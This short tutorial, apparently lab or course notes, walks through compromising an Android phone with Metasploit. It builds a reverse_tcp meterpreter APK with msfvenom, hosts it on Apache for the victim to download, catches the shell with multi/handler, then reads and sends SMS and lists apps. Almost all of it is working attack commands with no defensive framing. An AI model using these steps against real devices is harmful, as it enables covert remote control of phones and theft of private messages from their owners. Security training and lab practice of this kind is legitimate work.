
## Gaining Access With Android Meterpreter
	
	-> ifconfig
	
	
	
	Generate msfvenom payload for android device
	
	
		-> cd Desktop
	
		-> msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.3 LPORT=5555 -o shell.apk
		
		-> sudo mv shell.apk /var/www/html/	
	
	On the second terminal
	
		-> sudo service apache2 start
	
		
	
	Start Msfconsole
	
		-> msfconsole
		
		-> use exploit/multi/handler
		
		-> set payload android/meterpreter/reverse_tcp
		
		-> set LHOST 192.168.10.3
		
		-> set LPORT 5555
		
		-> run
		
		After opening the apk file on the android device we get the meterpreter shell
		
		-> getuid
		
		-> help
			
		-> send_sms -d +899898989932 -t “Hello World”
		
		-> dump_sms
		
		-> app_list
		
	On the android device
		
		-> Open the browser and enter the IP address of the kali linux machine
		
		-> Download the apk file and Install it.
		
		-> Open the application